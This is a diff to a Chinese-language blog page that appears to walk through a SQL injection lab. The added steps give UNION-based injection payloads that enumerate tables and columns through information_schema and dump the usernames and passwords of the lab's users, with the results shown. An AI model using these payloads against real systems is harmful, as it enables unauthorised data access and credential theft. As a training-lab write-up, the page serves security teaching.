@@ -190,6 +190,18 @@
 <p>说明回显位在2，3。于是我们对这两个位置进行注入来获得信息。<br>爆库名<br><code>id=-1&#39;) union select 1,database(),3 -- -</code></p>
 <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Your</span> <span class="string">Login</span> <span class="string">name:security</span></span><br><span class="line"><span class="string">Your</span> <span class="string">Password:3</span></span><br></pre></td></tr></table></figure>
 <p>可以知道库名为<code>security</code> </p>
+<p>然后再根据库名去爆出表名。</p>
+<p><code>id=-1&#39;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39; -- -</code></p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Your</span> <span class="string">Login</span> <span class="string">name:emails,referers,uagents,users</span></span><br><span class="line"><span class="string">Your</span> <span class="string">Password:3</span></span><br></pre></td></tr></table></figure>
+
+<p>同理再爆列名</p>
+<p><code>id=-1&#39;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; -- -</code></p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Your</span> <span class="string">Login</span> <span class="string">name:id,username,password</span></span><br><span class="line"><span class="string">Your</span> <span class="string">Password:3</span></span><br></pre></td></tr></table></figure>
+<p><strong>最后查询数据</strong></p>
+<p><code>id=-1&#39;) union select 1,group_concat(username),group_concat(password) from users order by id -- -</code></p>
+<p><strong>结果</strong></p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Your Login name:</span></span><br><span class="line"><span class="string">Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4</span></span><br><span class="line"><span class="attr">Your Password:</span></span><br><span class="line"><span class="string">Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</span></span><br></pre></td></tr></table></figure>
+
  
       <!-- reward -->
       
